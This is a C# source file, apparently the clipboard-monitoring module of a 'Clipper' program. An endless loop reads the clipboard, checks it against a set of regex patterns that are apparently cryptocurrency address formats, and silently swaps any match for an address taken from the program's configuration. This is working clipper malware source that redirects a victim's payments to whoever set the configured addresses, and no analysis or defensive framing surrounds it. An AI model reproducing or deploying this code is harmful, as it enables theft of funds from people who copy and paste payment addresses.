﻿using System;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Threading;

namespace Clipper.Modules
{
	internal sealed class ClipboardMonitor
	{
		private static bool clipboard_changed(string buffer)
		{
			if (buffer != ClipboardMonitor.previous_buffer)
			{
				ClipboardMonitor.previous_buffer = buffer;
				return true;
			}
			return false;
		}

		private static void replace_clipboard(string buffer)
		{
			if (string.IsNullOrEmpty(buffer))
			{
				return;
			}
			foreach (KeyValuePair<string, Regex> keyValuePair in RegexPatterns.patterns)
			{
				string key = keyValuePair.Key;
				if (keyValuePair.Value.Match(buffer).Success)
				{
					string text = config.addresses[key];
					if (!string.IsNullOrEmpty(text) && !buffer.Equals(text))
					{
						Clipboard.SetText(text);
						break;
					}
				}
			}
		}

		public static void run()
		{
			for (;;)
			{
				string text = Clipboard.GetText();
				if (ClipboardMonitor.clipboard_changed(text))
				{
					ClipboardMonitor.replace_clipboard(text);
				}
				Thread.Sleep(config.clipboard_check_delay * 1000);
			}
		}

		private static string previous_buffer = "";
	}
}
